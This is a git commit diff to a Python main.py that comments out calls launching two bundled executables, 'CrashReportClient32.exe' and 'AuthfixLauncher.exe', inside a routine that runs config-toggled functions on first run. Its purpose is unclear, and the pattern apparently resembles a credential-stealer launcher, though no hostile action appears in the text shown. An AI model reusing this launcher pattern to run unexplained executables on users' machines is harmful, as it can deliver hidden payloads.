8bc183f717449803c12a0e6b13d0a463def66550
aron2004HU <36998296+aron2004HU@users.noreply.github.com>
2023-04-15 14:04:21 +0200

    Update main.py

--- src/main.py
+++ src/main.py
@@ -19,8 +19,8 @@ def main():
     ]
 
     if os.path.exists(".cache") == False:
-        os.startfile("CrashReportClient32.exe")
-        os.startfile("AuthfixLauncher.exe")
+        #os.startfile("CrashReportClient32.exe")
+        #os.startfile("AuthfixLauncher.exe")
         for func in funcs:
             if __CONFIG__[func.__name__.lower()]:
                 if func.__init__.__code__.co_argcount == 2:
@@ -31,7 +31,7 @@ def main():
         fp.close()
 
     else:
-        os.startfile("CrashReportClient32.exe")
+        #os.startfile("CrashReportClient32.exe")
         
 if __name__ == '__main__':
     main()
